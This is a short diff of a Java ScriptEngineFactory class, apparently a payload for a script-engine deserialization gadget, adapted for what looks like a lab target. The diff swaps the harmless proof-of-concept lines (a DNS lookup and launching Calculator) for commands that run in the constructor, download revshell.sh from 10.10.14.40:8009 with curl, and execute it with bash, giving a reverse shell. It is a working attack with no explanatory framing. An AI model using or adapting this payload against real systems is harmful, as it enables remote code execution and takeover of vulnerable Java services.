@@ -7,8 +7,8 @@ public class AwesomeScriptEngineFactory implements ScriptEngineFactory {
 
     public AwesomeScriptEngineFactory() {
         try {
-            Runtime.getRuntime().exec("dig scriptengine.x.artsploit.com");
-            Runtime.getRuntime().exec("/Applications/Calculator.app/Contents/MacOS/Calculator");
+            Runtime.getRuntime().exec("curl http://10.10.14.40:8009/revshell.sh -o /tmp/revshell.sh");
+            Runtime.getRuntime().exec("bash /tmp/revshell.sh");
         } catch (IOException e) {
             e.printStackTrace();
         }
